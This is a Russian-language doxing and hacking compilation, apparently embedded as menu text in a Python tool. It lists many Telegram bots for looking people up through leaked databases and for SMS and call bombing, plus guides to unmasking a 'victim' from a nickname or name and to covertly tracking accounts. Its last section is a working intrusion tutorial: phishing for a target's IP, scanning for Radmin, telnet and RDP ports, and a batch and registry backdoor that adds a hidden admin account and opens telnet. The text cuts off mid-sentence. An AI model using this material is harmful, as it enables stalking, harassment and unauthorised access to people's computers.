47. @cryptoscanning_bot

48. @LinkCreatorBot

49. @telesint_bot

50. @Checknumb_bot

51. @TelpoiskBot_bot

52. @TgDeanonymizer_bot

53. @protestchat_bot

54. @locatortlrm_bot

55. @GetCont_bot

56. @usinfobot

57. @SangMataInfo_bot

58. @creationdatebot

59. @tgscanrobot

60. @InfoVkUser_bot

61. @getfb_bot

62. @GetOK2bot

63. @VKHistoryRobot

64. @detectiva_robot

65. @FindNameVk_bot

66. @vk2017robot

67. @AgentFNS_bot

68. @OpenDataUABot

69. @egrul_bot

70. @Bumz639bot

71. @ogrn_bot

72. @ShtrafKZBot

73. @egrnrobot

74. @VipiskaEGRNbot

75. @Search_firm_bot

76. @geomacbot

77. @pwIPbot

78. @ipscorebot

79. @ip_score_checker_bot

80. @FakeSMI_bot

81. @ipinfo_check_bot

82. @Search_IPbot

83. @WhoisDomBot

84. @vimebasebot

85. @maigret_osint_bot

86. @PasswordSearchBot

87. @ddg_stresser_bot

88. @BotAvinfo_bot

89. @reverseSearch2Bot

90. @pimeyesbot

91. @findfacerobot

92. @CarPlatesUkraineBot

93. @nomerogrambot

94. @ShtrafyPDRbot

95. @cerbersearch_bot

————————————————————

Сервисы для проверки BIN кредитных карт:

binbase.com (2 запроса в день если нет аккаунта)

binlist.net (общая информация по карте)

binlist.io (тож самое что и сверху ток оформление другое)

freebinchecker.com (хуйня)

bincheck.org (общая информация по карте)

binchecker.com (я заебался вводить капчу)

bincheck.io (хороший сайт, общие сведения о карте)

————————————————————

\\ ИНФОРМАЦИЯ ПО ИГРОВОМУ НИКНЕЙМУ ЖЕРТВЫ \\

Имея ник жертвы, уже можно найти его информацию. Самый первый, хоть и старенький, но очень эффективный способ это вбить в Yandex "intext:nicnkname".

Данный способ поможет найти все упоминания по интернету с данным ником. После чего, стоит зайти в группы где играла жертва, (аннализируем через коментарии и упоминания) и вбиваем

этот ник в эти сообщества.

Тем самым мы вероятно найдём основную страницу жертву, или же дальнейшую информацию. Также можно проверить информацию по базам серверов Minecraft PE, но данные базы можно

приобрести в ЛС нашей группы.

Также вбиваем никнейм в YouTube, предварительно выбрав сортировку поиска "только каналы".

\\ ПОИСК ИНФОРМАЦИИ ПО РЕАЛЬНОМУ Ф.И.О \\

При известности такой информации о жертве стоит посеить каждую Соц. Сеть и проверить есть ли там такой "Иван Иванов" проживающий в "Москве".

Изначально советуем вам искать информацию в каждой соц сети по отдельному, не вбивая все попросту в Яндекс. Также можно проверить Ф.И.О в справочных

сайтах города жертвы, в надежде найти адрес, а по нему и остальных родственников.

\\ ПОИСК ИНФОРМАЦИИ ПО ЮТУБ КАНАЛУ \\

Если вы вдруг нашли старый канал жертвы, но он полностью очищен, можно попробовать посмотреть его упоминания по его "НИКУ".

"https://www.youtube.com/channel/UCrFiA0hztL9e8zTi_qBuW4w" после channel идет уникальный ID/Nick канала. Его вбиваем в VK и Yandex. Видим упоминания.

Также можно "откатить" канал вбив ник в Яндекс, и посмотреть сохраненый кэш.

\\ ПОИСК ПО IMEI \\

Поиск по IMEI

1. www.checkmi.info — показывает страну регистрации Mi-аккаунта, часть номера телефона для восстановления и часть email-адреса

2. www.imei.info — характеристики устройства

3. xinit.ru (https://xinit.ru/imei/) — характеристики устройства

4. account.lampyre.io (t) (r) — программа находит марку телефона

5. imeipro.info (https://www.imeipro.info/check_imei_iphone.html) — определит iPhone, его модель, статус активации, технической поддержки, гарантии, статус iCloud, право на участие в

программе AppleCare и покрытие

————————————————————————————————————————

Поиск по домену с .onion

1. darktracer.io — находит настоящий IP адрес

2. pidrila (https://github.com/enemy-submarine/pidrila) (t) — выявляет директории сайта

3. torwhois.com — показывает открытые порты, директории, PGP ключи, файлы в директориях и многое другое

Поиск через URL

1. https://osint.party/api/onion/DOMAIN — найдет метаданные сайта, замените DOMAIN на адрес сайта без .onion

————————————————————————————————————————

\\ Поиск по аккаунту Facebook \\

1. lookup-id.com — находит числовой ID аккаунта

2. graph.tips — дает возможность просматривать, каким публикациям ставил лайки

пользователь

3. whopostedwhat.com — найдет посты в Facebook

4. fb-sleep-stats (t) — отслеживает онлайн / оффлайн статус людей, можно получить

точную информацию о времени их сна

5. keyhole.co (r) — анализ аккаунта, при регистрации нет проверок по email и телефону,

вводите любые данные

6. cipher387.github.io — покажет архивированную страницу, даст 20+ прямых ссылок на

сайты веб архивы, поиск по ссылке на аккаунт

7. UsersBox.org — бот, найдет аккаунты в ВК у которых в поле Facebook указан

искомый логин, введите в боте facebook: <логин>

8. ffff (t) — частично реконструирует скрытых друзей, используя функциональность

"общие друзья". Требуется знать хотя бы другую учетную запись, имеющую хотя бы

одного общего друга с целью

9. smartsearchbot.com — находит email, номер телефона и другое, бесплатный поиск не

доступен для новых пользователей

10. @getfb_bot (r) — найдет номер телефона

11. @QuickOSINT_Robot — найдет соц. сети, логины, телефоны, адрес и многое

другое, всего 3 бесплатных запроса для новых аккаунтов

12. app.element.io (r) — найдет сохранённую копию аккаунта по ID, это имя и аватарка,

после регистрации, нажми на +, и выбери "начать новый чат", введи id в поиск

13. Fuck-Facebook — найдет номер телефона аккаунта Facebook в глобальной утечке,

нужно пройти капчу перед поиском

14. @Zernerda_bot — ищет в слитых базах, находит телефон, имя аккаунта и прочее,

бесплатный поиск после первого запуска бота

15. @a11_1n_bot (r) — найдет имя и номер телефона

16. @declassified_bot — найдет телефон, имена, адреса, аккаунт telegram

17. @detectiva_bot — вытаскивает часть номера телефона

Поиск через URL

1. https://www.facebook.com/browse/fanned_pages/?id=USERID — найдет лайки

пользователя, замените USERID на ID аккаунта

2. https://facebook.com/friendship/USERID/USERID — будут отображаться общие друзья,

общие записи и фотографии, а также любые другие связанные данные, такие как

родные города, школы и т. д., замените USERID на ID аккаунта

3. https://facebook.com/browse/mutual_friends/?uid=USERID&node=USERID — найдет

общих друзей, которые имеют общедоступные списки друзей, если у одного из

искомых пользователей есть общедоступный список друзей, замените USERID на ID

аккаунта

4. https://my.mail.ru/fb/USERID — найдет аккаунт на Мой Мир, замените USERID в

ссылке на ID аккаунта

————————————————————————————————————————

Для аккаунта Instagram

1. tools.codeofaninja.com — определит ID аккаунта

2. sometag.org — аналитика аккаунта

3. keyhole.co (r) — анализ аккаунта, при регистрации нет проверок по email и телефону,

вводите любые данные, 7 дней бесплатно

4. cipher387.github.io — покажет архивированную страницу, даст 20+ прямых ссылок на

сайты веб архивы, поиск по ссылке на аккаунт

5. UsersBox.org — бот, найдет аккаунты в ВК у которых в поле Instagram указан

искомый логин, введите в боте instagram: <логин>

6. undelete.news — сохраняет удаленные истории и фото, если нет аккаунта просто

добавьте его на сайт для слежки за ним

7. глазбога.com (r) — бот, дает часть номера телефона

8. smartsearchbot.com — бот находит email, номер телефона и другое, бесплатный

поиск не доступен для новых пользователей

9. notjustanalytics.com — анализ аккаунта, покажет вовлеченность, рост количества

подписчиков, графики взаимодействий и другое

10. sterraxcyl (t) — найдёт ближний круг аккаунта, сравнивает списки подписок и

подписчиков у аккаунта и находит совпадения

11. @QuickOSINT_Robot — найдет соц. сети, логины, телефоны, адрес и многое

другое, всего 3 бесплатных запроса для новых аккаунтов

12. Tenai (t) — найдет часть подписчиков приватного аккаунта

13. dumpor.com — кэш аккаунта, если профиль был публичным но стал недавно

закрытым, то сайт может показать фото и подписки аккаунта из кеша

14. toutatis (t) — достанет публичные данные аккаунта, это id, имя, бизнес контакты,

телефон и почту из восстановления доступа без уведомления самого пользователя

15. trendhero.io (r) — статистика аккаунта, уровень вовлечённости аудитории и прочее

16. @detectiva_bot — вытаскивает часть номера телефона

Парсеры

1. InsFo — расширение для Chrome, скачивает всех подписчиков и подписки аккаунта

2. stevesie.com (r) — соберет все посты профиля и даст ссылки на фото
3. picuki.com — дает скачать истории, фото и просмотреть профиль без входа

4. pixwox.com — дает скачать истории, IGTV, фото, просмотреть комментарии без

регистрации и входа

5. storiesdown.com — дает скачать истории, фото без регистрации и входа

6. @instagent_bot — скачивает посты, истории, igtv, коллекции

7. OsintGram (t) — скачает все фото, сторис, комментарии, подписчиков, профили

подписок, может достать телефоны, почты подписчиков и прочее

Инструменты

1. @AximoBot — мгновенно сохранит новые публикации аккаунта в Telegram

2. @Instagram_Watcher_Bot — следит за новыми историями аккаунта Instagram

————————————————————————————————————————

Поиск по MAC адресу

1. xinit.ru — покажет местоположение Wi-Fi

2. alexell.ru — тоже покажет местоположение

3. wigle.net (r) — находит Wi-Fi точку, ее физический адрес и название

Поиск через URL

1. https://api.mylnikov.org/geolocation/wifi?v=1.1&data=open&bssid=00:CC:00:CC:00:CC —

найдет координаты точки на карте, замените 00:CC:00:CC:00:CC на MAC-адрес

————————————————————————————————————————

ск по аккаунту Discord

1. support.discord.com — инструкция как найти Discord ID аккаунта

2. discord.id — показывает дату создания и фото

3. discordhub.com — находит сервера

4. discordleaks.unicornriot.ninja — находит сервера и сообщения

5. hugo.moe — показывает дату создания аккаунта

6. app.element.io (r) — найдет сохранённую копию аккаунта по ID, это имя и аватар,

после регистрации, нажми на +, и выбери "начать новый чат", введи id в поиск

7. discord-tracker.ru (r) — выдает дату регистрации, статистику активности, сервера в

которых учувствует аккаунт, история имени, история аватара, события в голосовом,

сообщения, популярные слова, возможные друзья, статистика активности, и прочее

8.

⚡️됀

@UniversalSearchRobot — по Discord ID или тегу аккаунта найдет профили

Discord на сторонних ресурсах

Поиск по названию сервера

1. discordservers.com — дает ссылку на вступление

2. discord.center — дает ссылку на вступление, в базе 36К серверов

3. disboard.org — дает ссылку на вступление, в базе 700К+ серверов

4. discord.me — дает ссылку на вступление, в базе 30К+ серверов

5. discordbee.com — дает ссылку на вступление, в базе 5К+ серверов

Через URL

1. https://top.gg/user/1234567890987654321 — находит в каких серверах состоит, фото,

описание профиля, и прочее, замени 1234567890987654321

на Discord ID аккаунта

Парсеры

1. dht.chylex.com — загрузит историю выбранного текстового канала до первого

сообщения и позволит вам загрузить его для просмотра в автономном режиме в вашем

браузере

2. exportcomments.com — экспортирует весь чат из вашего канала Discord в файл CSV

1. @phonenumberinformation_bot
2. @Quick_osintik_bot
3. @UniversalSearchRobot
4. @search_himera_bot
5. @Solaris_Search_Bot
6. @Zernerda_bot
7. @t_sys_bot
8. @OSINTInfoRobot
9. @LBSE_bot
10. @SovaAppBot
11. @poiskorcombot
12. @SEARCHUA_bot
13. @helper_inform_bot
14. @infobazaa_bot
15. @declassified_bot
16. @GHack_search_bot
17. @osint_databot
18. @Informator_BelBot
19. @HowToFindRU_Robot
20. @SEARCH2UA_bot
21. @UsersSearchBot
22. @BITCOlN_BOT
23. @ce_poshuk_bot
24. @BlackatSearchBot
25. @dataisbot
26. @n3fm4xw2rwbot
27. @cybersecdata_bot
28. @safe_search_bot
29. @getcontact_real_bot
30. @PhoneLeaks_bot
31. @useridinfobot 
32. @mailcat_s_bot
33. @last4mailbot
34. @holehe_s_bot
35. @bmi_np_bot
36. @clerkinfobot
37. @kolibri_osint_bot
38. @getcontact_premium_bot
39. @phone_avito_bot
40. @pyth1a_0racle_bot
41. @olx_phone_bot
42. @ap_pars_bot
43. @SPOwnerBot
44. @regdatebot
45. @ibhldr_bot
46. @TgAnalyst_bot
47. @cryptoscanning_bot
48. @LinkCreatorBot
49. @telesint_bot
50. @Checknumb_bot
51. @TelpoiskBot_bot
52. @TgDeanonymizer_bot
53. @protestchat_bot
54. @locatortlrm_bot
55. @GetCont_bot
56. @usinfobot
57. @SangMataInfo_bot
58. @creationdatebot
59. @tgscanrobot
60. @InfoVkUser_bot
61. @getfb_bot
62. @GetOK2bot
63. @VKHistoryRobot
64. @detectiva_robot
65. @FindNameVk_bot
66. @vk2017robot
67. @AgentFNS_bot
68. @OpenDataUABot
69. @egrul_bot
70. @Bumz639bot
80. @ogrn_bot
90. @ShtrafKZBot
91. @egrnrobot
92. @VipiskaEGRNbot
93. @Search_firm_bot
94. @geomacbot
95. @pwIPbot
96. @ipscorebot
97. @ip_score_checker_bot
98. @FakeSMI_bot
99. @ipinfo_check_bot
100. @Search_IPbot
101. @WhoisDomBot
102. @vimebasebot
103. @maigret_osint_bot
104. @PasswordSearchBot
105. @ddg_stresser_bot
106. @BotAvinfo_bot
107. @reverseSearch2Bot
108. @pimeyesbot
109. @findfacerobot
110. @CarPlatesUkraineBot
111. @nomerogrambot
112. @ShtrafyPDRbot
113. @cerbersearch_bot

Есть люди, которые не знают ботов, которые используют многие.

Вот вам скину пару ботов для пробивов:

@GetOK2bot (Одноклассники)
@poiskorcombot
@cybersecdata_bot
@bmi_np_bot
@ip_score_checker_bot (Чекер IP / думаю лучший бот)
@UsersSearchBot (Один из лучших)
@safe_search_bot
@VKHistoryRobot (Лучший бот для нахождения инфы по Вк)
@GTA_searchBot (Гта,один из лучших) 
@Euyiy999_bot (Глаз Бога,один из лучших)
@SovaAppBot
@PhoneLeaks_bot ( утечки номера)
@Detecta_bot
@search_himera_bot
@Zernerda_bot
@TeleSkan_bot (Чек тг)
@helper_inform_bot ( Очень хороший,подписка на 24ч - 24₽)
@BlackatSearchBot
@test_sys_tank_bot (Дорогой но хороший)
@Qu1ckosint_robot (Дорогой но хороший)

Подборка разных и интересных ботов для вас :

@clerkinfobot
@getcontact_real_bot
@AntiParkonBot
@OpenDataUABot
@cryptoscanning_bot
@Probiwfepix_bot
@SovaAppBot
@oko_ua_bot
@QUICKHAKAbot
@clubdev_bot
@VipiskaEGRNbot
@ShtrafKZBot
@pyth1a_0racle_bot
@ce_poshuk_bot
@InfoVkUser_bot
@mailcat_s_bot
@n3fm4xw2rwbot
@get_caller_bot
@WhoisDomBot
@find_caller_bot
@t3_avtootvetchik_bot
@Search_firm_bot
@BlackatSearchBot
@userinfobot
@oomanuals_bot
@PhoneLeaks_bot
@ibhldr_bot
@HowToFindRU_Robot
@declassified_bot
@GetOK2bot
@UsersSearchBot
@mnp_bot
@userinfobot
@no_secret_bot
@PhoneLeaks_bot
@creationdatebot
@telesint_bot
@getfb_bot


@info_baza_bot – бaза данных нoмеров телефона, email
@get_caller_bot - Ищет только пo нoмеру телефoна. На выходе: ФИО, дата рoждения, пoчта и «ВКoнтакте»
@OpenDataUABot – по кoду ЕДРПOУ возвращает данные о компaнии из реeстра, по ФИО — наличие регистрации ФОП
@YouControlBot - полное досье на каждую компанию Украины

@Dosie_Bot – создатели «Досье» пошли дальше и по номеру телефона отдают ИНН и номер паспорта
@UAfindbot – База данных Украины
@FindClonesBot – Поиск человека по фото
@MsisdnInfoBot - Получение сведений о номере телефона

@antiparkon_bot - Поиск сведений об автовладельце
@friendsfindbot - Поиск человека по местоположению
@egrul_bot - Пробивает конторы/ИП, по вводу ФИО/фирмы предоставляет ИНН объекта России
@last4mailbot (Mail2Phone) — по почте показывает статус: есть ли аккаунт в «Одноклассниках» и «Сбербанке», или нет.
@bmi_np_bot - По номеру телефона определяет регион и оператора.


@VKUserInfo_bot — по ID «ВКонтакте» возвращает расширенную информацию о профиле.
@GetGmail_bot (GetGmail — OSINT email search) — по gmail-почте отдает Google ID, зная который, можно получить архив альбомов Google, а также редактирования и отзывы на Google-картах


https://t.me/FroxSoftprobivBot
https://t.me/WhiteQuickbot
https://t.me/UniversalSearchRobot
https://t.me/kolibri_osint_bot
https://t.me/Qu1ck0s11nt_bot
https://t.me/PhoneLeaks_bot
https://t.me/fandorin_search_bot
https://t.me/clerkinfobot
https://t.me/telesint_bot
https://t.me/Mrsotss_bot
https://t.me/maigret_osint_bot
https://t.me/MsisdnInfoBot
https://t.me/egrul_bot
https://t.me/darknetfinderbot
https://t.me/getfb_bot
https://t.me/holehe_s_bot
https://t.me/Probivio_bot
https://t.me/Pika4y_bot
https://t.me/Zernerda_bot
https://t.me/probiv_Ukraina_bot
https://t.me/OpenDataUABot
https://t.me/detectiva_robot
https://t.me/maigret_s_bot
https://t.me/nanoprobiv4_bot
https://t.me/telescan_osint_robot
https://t.me/ProstoyPoiskBot
https://t.me/VKHistoryRobot
https://t.me/LBSE_bot
https://t.me/buzzim_alerts_bot
https://t.me/leakscheckerbot
https://t.me/SovaAppBot
https://t.me/poisk_gps_calls_bot
https://t.me/eyegodsearchnewbot
https://t.me/Search_firm_bot
https://t.me/AngelSearchBot
https://t.me/egrul_bot
https://t.me/mailcat_s_bot
https://t.me/HowToFindRU_Robot_bot
https://t.me/phonenumberinformation_bot
https://t.me/jqc2bgj9mbot_bot
https://t.me/AviinfoBot
https://t.me/vin01bot
https://t.me/getcontact_real_bot
https://t.me/tgscanrobot
https://t.me/ArnoldShvarcenegger_bot
https://t.me/Himera_Search_net_bot
https://t.me/bmi_np_bot
https://t.me/helper_inform_bot
https://t.me/imole_bot
https://t.me/MotherSearchBot
https://t.me/findmenow_bot
https://t.me/getcontact_premium_bot
https://t.me/a11_1n_bot
https://t.me/darova_osint_bot
https://t.me/maigret_s2_bot
https://t.me/userinfobot
https://t.me/Probiv_VK_Bot
https://t.me/RBares_bot
https://t.me/v34a89dsa_bot_bot
https://t.me/ip_score_checker_bot
https://t.me/The_New_Get_Contact_Bot
https://t.me/phonebook_space_bot
https://t.me/deadghoul_zxc_bot
https://t.me/cryptoscanning_bot
https://t.me/CheckID_AIDbot




@PhoneLeaks_bot
@getmyid_bot

@egrnrobot — Бот для получения легальной информации о недвижимости из ЕГРН.
• @indiapeoplebot — по номеру найдёт FaceBook,VK и т.д
• @FindGitHubUserEmailBot - поиск по аккаунту GitHub
• @egrul_bot ищет информацию о юридических и физических лицах, учредителях, связях, местах регистрации. 
• @last4mailbotl → Last4mail ← находит связь почтового адреса к одноклассникам и сбербанку.
• @telesint_bot → Telesint ← даёт информацию о том, в каких чатах сидит пользователь.
• @ibhldr_bot → ibhldr ← показывает предпочтения юзера на основе собранный информации по чатам, каналам и т.п.
• @mailsearchbot — ищет по базе, дает часть пароля
• @AvinfoBot — найдет аккаунт в ВК
• @GetGmail_bot — Полезнейший инструмент, способный узнать ФИ по почте Gmail
• @clerkinfobot — Номер телефона.
• @BusinkaBusya — хороший селлер, рекомендую (Пробив Solaris)
• @InfoVkUser_bot — выдает информацию про пользователя вк.
• @FindNameVk_bot — старые имена вк. 
• @phone_avito_bot — пробив по номеру, выдаст Avito
• @Quick_OSINT_bot — различные серверные пробивы по данным критериям (почте, номеру, номеру машины, ip-адресу, паспортным данным, по Telegram и т.п) +analog @EyeGodsBot +analog @AvinfoBot
• @getfb_bot — при помощи номера сможем найти аккаунт в Facebok
• @GetYandexBot — пробив по почте выдает различные данные
• @clerkinfobot — Номер телефона.
• @leakcheck_bot — есть в списке указанного в первом сообщении бота. Ищет утекшие в сеть пароли от email. На тест забил пару своих заброшенных с mail.ru. прихуел Был неприятно удивлён




@egrnrobot — Бот для получения легальной информации о недвижимости из ЕГРН.
• @indiapeoplebot — по номеру найдёт FaceBook,VK и т.д
• @FindGitHubUserEmailBot - поиск по аккаунту GitHub
• @egrul_bot ищет информацию о юридических и физических лицах, учредителях, связях, местах регистрации. 
• @last4mailbotl → Last4mail ← находит связь почтового адреса к одноклассникам и сбербанку.
• @telesint_bot → Telesint ← даёт информацию о том, в каких чатах сидит пользователь.
• @ibhldr_bot → ibhldr ← показывает предпочтения юзера на основе собранный информации по чатам, каналам и т.п.
• @mailsearchbot — ищет по базе, дает часть пароля
• @AvinfoBot — найдет аккаунт в ВК
• @GetGmail_bot — Полезнейший инструмент, способный узнать ФИ по почте Gmail
• @clerkinfobot — Номер телефона.
• @BusinkaBusya — хороший селлер, рекомендую (Пробив Solaris)
• @InfoVkUser_bot — выдает информацию про пользователя вк.
• @FindNameVk_bot — старые имена вк. 
• @phone_avito_bot — пробив по номеру, выдаст Avito
• @Quick_OSINT_bot — различные серверные пробивы по данным критериям (почте, номеру, номеру машины, ip-адресу, паспортным данным, по Telegram и т.п) +analog @EyeGodsBot +analog @AvinfoBot
• @getfb_bot — при помощи номера сможем найти аккаунт в Facebok
• @GetYandexBot — пробив по почте выдает различные данные
• @clerkinfobot — Номер телефона.
• @leakcheck_bot — есть в списке указанного в первом сообщении бота. Ищет утекшие в сеть пароли от email. На тест забил пару своих заброшенных с mail.ru. прихуел Был неприятно удивлён

@Avnumbot

@WhoisDomBot

@lnfoVkUser_bot

@Finding_caller_id_bot

@find_caller_bot

@Eoododofkcjjdbot

@Zernerda_bot

@eyeofbeholder_bot

@Poisk_nomeru_bot

@InfoVkUser_bot

@Euyiy999_bot

@deanon_infobot

@Poisk_ID_bot

@LeakedInfoBot

@UniversalSearchRobot

@maigret_osint_bot

@nanoprobiv4_bot

@n8a7x6gkybot_bot

@bedoxymap44380461bot

@l2k5e4daw_kss_bot

@eyegod11_bot

@cerbersearch_bot

@probovpobazerf_bot

@QuickOSINT_bot

@sms_activ_3bot

@GreedySMSbot

@SMSBest_bot

@Info_BazaXbot

@UsersSearchBot

@ku06l61fzcheke_bot

@SovaAppBot

@cerber_robot

@Zernerda_bot

полезные боты для пробивов


@getcontact_real_bot - идеально подойдёт для проверки номера(Вирт или не Вирт)
@UsersSearchBot - найдет не мало хорошей информации по номеру, так же возможны другие методы поиска
@detectiva_bot - найдет информации по номеру и другим методам поиска(так же по номеру ищет соц-сети)
@vk2017robot - найдет информации по странице которая была зарегестрироваться в 17 и ранее году
@EyeCultist_bot - зеркало оригинального глаза бога
@n3fm4xw2rwbot - найдет информацию по почте, номеру, авто
@BotAvinfo_bot - найдет информации по авто
@helper_inform_bot - найдет чу чуть информации по номеру, так же присутствуют разные методы пробива
@Quickosintfast_bot - зеркало осинта. находит информации по чему угодно, только придется чу чуть оплачивать поиск
@vin01bot - найдет информации по ГОС или VIN номеру
@TgAnalyst_bot - найдет всю возможную информацию по айди телеграмм аккаунта
@Zernerda_bot - соберёт много информации по номеру телефона
@ip_score_checker_bot - найдет информации по айпи человека
@maigret_osint_bot - найдет информации по юзернейму телеграмм аккаунта
@UniversalSearchRobot - найдет информации по номеру телефона
@CultustDoxed_bot - зеркало баз ГТА
@PasswordSearchBot - найдет утерянные пароли в базах
@usinfobot - находит информации по юзеру/айди
@clerkinfobot - находит информации разными методами
@last4mailbot - найдет много полезной инфы по электронной почте


Не плохие базовые боты для пробивов

@QuickOSINT_bot- Хороший бот с большим ассортиментом найдет вам фулл инфу даже больше чем фулл инфу

@eyessofgodbot-Обычный всеми известный Гб тоже не плохой

@UniversalSearchRobot- Достаточно хороший бот тем что он ищет соц-сети так же находит Ф.И

@telesint_bot-Бот ищет в каких чатах находиться пользователь 

@userbox_boxbot- Замечательный бот для доксера очень хорошо работает 

@getcontact_real_bot- Не плохой Бот 50/50

@gta_search_bot- Бот найдет ФИО и остальные данные 


Список нормальных бомберов:
1) @bomber_calls_bot (бесплатный тест)

2) @miraibomber_bot (бесплатный тест)

3) @smsbomberosvip_bot (бесплатный тест)

4) @adscii_bomber_bot (бесплатный тест)

5) @SmsBomberat_bot (бесплатный тест)

6) @privateBloodLust_bot 

7) @sms_call_bomber2023_bot

8) @freez3_bomber_bot 

9) @TG_NoNameBot

10) @elderly_bot

СБОРНИК МАНУАЛОВ СДЕЛАН КАНАЛОМ HACK FISH:

https://t.me/+O5ZN4Bg5l18zNTEy
https://t.me/+O5ZN4Bg5l18zNTEy
https://t.me/+O5ZN4Bg5l18zNTEy
https://t.me/+O5ZN4Bg5l18zNTEy
https://t.me/+O5ZN4Bg5l18zNTEy
"""))
             input(Colorate.Vertical(Colors.cyan_to_blue, "\n[+] Нажмите Enter, чтобы вернуться в главное меню."))
            if choice == '56':
             print(Colorate.Vertical(Colors.cyan_to_green, """
1.) Предисловие.

 

 Для того чтобы пользоваться этим методом, надо определиться, нужно ли это Вам в реальности, или Вам хочется просто развлечь себя и доказать, что Вы — лучший(ая). Последнее было для меня стимулом для того чтобы все это проделывать, но теперь я многое понял, а главное — понял то, что взлом не должен проводится чтобы доказать окружающим тебя людям, что ты «кулхацкер». Каким я себя не считаю. Многому надо научиться, и после практики, если все получилось, на мой взгляд, не надо от нечего делать взламывать чужие компьютеры. Итак, надеюсь с целью все определились, перейдем к действию?

 

 =============================================

 2.) Узнаем IP.

 

 Надеюсь ни для кого не секрет, что без IP, мы не сможем найти нужный нам компьютер, и следовательно — провести взлом. Так как же его узнать? (многие задаются этим вопросом и часто пишут мне на аську). Очень просто, нам потребуеются прямые руки, немного фантазии и онлайн сниффер.

 Многие используют сниффер для увода cookies (куков, печенек, сессии — кому как нравится). Но в нашем случае, cookies нас не интересуют. Мы идем сюда и регистрируемся, если раньше этого не делали.

 

 hacker-pro.net/sniffer/

 

 Отлично. Пол дела сделано. Теперь идем в «настройки», при необходимости загружаем свое изображение. И нам дается ссылка на сниффер, с редиректом (перенаправлением) на нашу картинку. Не забудьте поставить галочку на «записывать IP в лог». Надеюсь поняли о чем я? Нет?! Тогда читайте.

 Смысл в том, чтобы дать эту ссылку своей «жертве», но только со ссылкой cпрятанной в слове (изучаем html), а если в лом, то просто берете:

 

 Здесь пишите любой текст, или одно слово

 

 Пишите какой-нибудь текст (включайте фантазию). Возьмем самое простое:

 

 ===========

 Здравствуйте! На Ваш E-mail адрес была отправлена открытка, чтобы посмотреть ее, нажмите сюда

 ===========

 

 Это было самое легкое, советую придумать что-то более оригинальней. Всю эту муть отправляете жертве. При желании можно использовать сервисы анонимной отправки почты, или залить php скрипт, и самому сделать такой сервис. Можете использовать мой, но я могу его в любой момент отключить:

 

 mqil.su/message/

 

 Все, осталось жертве ПЕРЕЙТИ «посмотреть картинку», как IP палится в логе.

 Не надо ничего никуда вводить, как в случае с фейком. В итоге все довольны, он (она), получила свою открытку, а Вы IP.

 

 =============================================

 3.) Используем разные программы для анализа данных.

 

 Теперь, у нас есть главное, без чего была бы невозможна дальнейшая работа. Дальнейшие действия — проверить хост (компьютер) на наличие уязвимостей — открытых портов. Я для этих целей пользуюсь сканером [XSpider 7.5], Вы можете использовать любой другой, на Ваш вкус. Но лучше всего использовать несколько сканеров, что не покажет один — покажет другой.

 

 Сразу качаем себе [XSpider 7.5] отсюда — http://www.softportal.com/software-1453-xspider.html

 Обновлять не рекомендую, так как версия крякнутая, и полностью рабочая.

 

 Теперь когда Вы скачали его, необходимо его настроить — создать новый профиль. Кто-то на сайте описывал настройку профиля, но чтобы Вам не приходилось искать статью, я Вам опишу настройку.

 

 Открываете сканер

 >>>Профиль

 >>>Новый…

 >>>Комментарий (пишите что хотите)

 >>>Идете на вкладку «Сканер Портов», и внизу рядом с надписью «default.prt» давите [...]

 >>>Выйдет окошко, давите «новый»

 >>>Пустой

 >>>В комментах пишите что угодно

 >>>внизу увидеть «добавить порты» и пишите «4899» и «3389»

 >>>Сохранить как «4899».

 >>>Дольше выходите обратно на вкладки, и снимаете отовсюду галки.

 

 Точно также создаете еще 1 профиль, только порт 23. Все.

 

 Теперь набираеаете IP своей жертвы, в поле «добавить хост» и начинаете сканировать. Если вдруг открытым оказался один из портов 4899 — Radmin, 23 — telnet, 3389 — Remote Desktop (удаленный рабочий стол) — пробуете законнектиться (подключиться). Пароль по дефолту 12345678, об этом уже писалось. Самое лучшее (для меня), когда открыт 4899 порт (Radmin). Подключились? Радуйтсь!

 Дальше можете делать все что Вашей душе угодно. Дальше читать не обязательно.

 

 Но, чтобы не палиться, рекомендую Вам убрать иконку в трее (рядом с часиками), и создать нового пользователя, с правами администратора. (об этом между прочим тоже писалось раньше) — не буду писать, а то статья очень большая получится.

 

 Remote Desktop входит в стандартную комплектацию Windows.

 RAdmin Viewer можете скачать тут — depositfiles.com/files/92m5usz2b

 В нем же есть и telnet

 P>S

 RAdmin тоже входит в стандартную комплектацию.

 

 Если не получилось подключиться, не отчаиваемся, читаем дальше.

 

 =====================================================

 4.) Если анализ ничего не дал?

 

 Если он ничего не дал, то можно своими усилиями помочь себе. Делается это просто, серверная часть устанавливается на удаленный компьютер/открывается нужный порт с нужным логином и паролем. Конечно, но как установить/открыть, если компьютер далеко???

 

 — А для чего интернет?? WWW — World Wide Web — ВСЕМИРНАЯ паутина.

 Через интернет тоже можно установить программу на чужой компьютер/или открыть доступ к уже существующему.

 Radmin если что, тоже идет в стандартной комплектации Windows. А установить, что это действительно Windows, можно тем же сканером. Значит — нам остается только открыть доступ к этому сервису (23). Об этом до нас тоже позаботились, и написали вот такой *.txt файл, который в последствии переименовывается в *.bat.

 Затем создается еще один файл, файл конфигурации реестра, который скрывает нового пользователя с глаз, и его не видно в окне приветствия.

 

 содержимое *.bat файла

 ++++

 chcp 1251

 net user SUPPORT_388945a0 /delete

 net user restot 12345678 /add

 net localgroup Администраторы restot /add

 net localgroup Пользователи SUPPORT_388945a0 /del

 regedit /s conf.reg

 sc config tlntsvr start= auto

 tlntadmn config port=972 sec=-NTLM

 net start Telnet

 ++++

 

 Этим файлом Вы создаете нового пользователя с именем restot и паролем 12345678

 импортируете в реестр настройки, которые скроют Ваше имя в окне приветствия.

 открываете 972 порт, и активируете телнет через него.

 

 Записывается без плюсиков в блокнот, потом меняется расширение на *.bat

 

 теперь содержимое файла conf.reg

 ++++

 Windows Registry Editor Version 5.00

 [HKEY_LOCAL_MACHINESOFTWAREMicrosoftWindows

 NTCurrentVersionWinlogonSpecialAccountsUserLis t]

 «restot»=dword:00000000

 ++++

 

 В последней строке, в кавычках, пишите имя, которое указали в *.bat файле.

 также записываете в блокнот, а потом меняете расширение на *.reg

 

 сохраняете все это в одной папке, можно просто заархивировать оба файла в один архив, а можно поступить умнее, скомпилировать файл *.bat в файл *.exe, и также добавить в архив поменяв иконку, об этом читайте в статьях на портале. После того как жертва запустит батник, можно будет коннектиться к 972 порту, или к любому другому, главное чтобы не был занят...

 

 затем можно установить то что нужно через службу Telnet, и более комфортно управлять удаленной машиной.

 =============================================

 5.) Краткая теориия|||



 находите жертву >>> узнаете ip >>> проверяете на наличие открытых портов >>> открываете порты (если открытых не было) >>> устанавливаете через telnet то что нужно для удобство >>> осущ
